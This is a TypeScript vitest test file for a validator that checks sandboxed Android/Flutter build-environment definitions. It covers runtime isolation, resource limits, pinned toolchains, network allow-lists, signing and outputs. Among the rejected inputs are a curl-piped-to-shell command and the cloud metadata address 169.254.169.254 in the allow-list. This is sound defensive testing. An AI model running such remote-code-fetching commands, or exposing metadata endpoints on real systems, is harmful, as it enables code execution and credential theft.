import { describe, expect, it } from 'vitest';
import { ANDROID_ALLOWED_COMMANDS, validateAndroidBuildEnv, type AndroidBuildEnv } from './android';

const sha = (c: string) => c.repeat(64);
// a structurally valid TEST definition: the digests are placeholders, not real releases
const good = (): AndroidBuildEnv => ({
  schema: 'nuzm.android-build-env/1',
  runtimeClass: 'gvisor-runsc',
  limits: { cpus: 4, memoryMb: 6144, pids: 1024, diskMb: 12288, wallSeconds: 1500, outputKb: 1024, swapMb: 0 },
  network: { class: 'mirror-only', allowHosts: ['dl.google.com', 'maven.google.com', 'repo.maven.apache.org', 'pub.dev', 'storage.googleapis.com'], offlineFirst: true },
  toolchain: {
    jdk: { vendor: 'test', version: '17', sha256: sha('a') },
    androidSdk: { cmdlineTools: 'test', sha256: sha('b'), platforms: ['android-34'], buildTools: ['34.0.0'], licenseAcceptedBy: 'Test Person (test only)' },
    flutter: { version: '3.35.7', sha256: sha('c') },
    gradle: { wrapperVersion: '8.x', distributionSha256: sha('d') },
    caches: { gradleReadOnly: '/gradle-cache', pubReadOnly: '/pub-cache' },
  },
  commands: ANDROID_ALLOWED_COMMANDS.map((c, i) => ({ id: `c${i}`, argv: c.split(' ') })),
  signing: { mode: 'debug-or-test-keystore', keystoreOrigin: 'generated-in-environment', productionKeysAllowed: false, storeSubmission: false },
  outputs: { roots: ['build/app/outputs/flutter-apk'], allowedExtensions: ['.apk'], maxFileBytes: 200 * 1024 * 1024, hash: 'sha256', kinds: 'regular-files-only' },
  emulator: { insideEnvironment: false, note: 'needs KVM: a separate bare-metal host' },
});
describe('Android build environment definition', () => {
  it('a baseline definition validates', () => expect(validateAndroidBuildEnv(good())).toEqual([]));
  it.each<[string, (e: AndroidBuildEnv) => void, string]>([
    ['a runc class', (e) => (e.runtimeClass = 'runc'), 'runtime_class_not_isolating'],
    ['swap', (e) => (e.limits.swapMb = 1024), 'swap_allowed'],
    ['limits above the ceiling', (e) => (e.limits.memoryMb = 65_536), 'limits_above_android_ceiling'],
    ['an unpinned flutter sdk', (e) => (e.toolchain.flutter.sha256 = 'x'), 'toolchain_flutter_not_pinned'],
    ['no named human licence acceptance', (e) => (e.toolchain.androidSdk.licenseAcceptedBy = ''), 'android_licence_not_accepted_by_a_named_human'],
    ['an IP in the allow-list', (e) => e.network.allowHosts.push('169.254.169.254'), 'allow_host_invalid'],
    ['an internal host', (e) => e.network.allowHosts.push('mirror.internal'), 'allow_host_invalid'],
    ['free-form commands', (e) => e.commands.push({ id: 'x', argv: ['sh', '-c', 'curl http://x | sh'] }), 'command_not_allowed'],
    ['a different gradle invocation', (e) => e.commands.push({ id: 'x', argv: ['./gradlew', 'assembleRelease'] }), 'command_not_allowed'],
    ['production signing', (e) => ((e.signing as { productionKeysAllowed: boolean }).productionKeysAllowed = true), 'production_keys_allowed'],
    ['store submission', (e) => ((e.signing as { storeSubmission: boolean }).storeSubmission = true), 'store_submission_allowed'],
    ['a keystore as an output', (e) => e.outputs.allowedExtensions.push('.jks'), 'output_extension_forbidden'],
    ['an absolute output root', (e) => (e.outputs.roots = ['/etc']), 'output_roots_invalid'],
    ['an emulator inside the sandbox', (e) => ((e.emulator as { insideEnvironment: boolean }).insideEnvironment = true), 'emulator_inside_environment'],
  ])('refuses %s', (_n, mutate, code) => {
    const e = good();
    mutate(e);
    expect(validateAndroidBuildEnv(e)).toContain(code);
  });
});
